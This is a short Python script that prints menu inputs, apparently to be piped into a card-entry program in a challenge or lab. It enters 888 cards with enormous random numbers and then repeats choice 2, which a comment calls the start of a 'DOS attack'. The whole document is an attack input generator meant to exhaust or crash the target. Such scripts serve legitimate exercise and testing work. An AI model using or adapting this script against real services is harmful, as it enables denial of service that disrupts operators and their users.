import random

# A very large number
n = 10000000000000000000000000000

# Perform choice 1 with larger numbers
for i in range(999-111):
    print(1)                            # Choose choice 1
    print(random.randint(n,n + 1000))   # Enter a new card

# Perform choice 2 to begin DOS attack
for i in range(1+111):
    print(2)                            # Choose choice 2
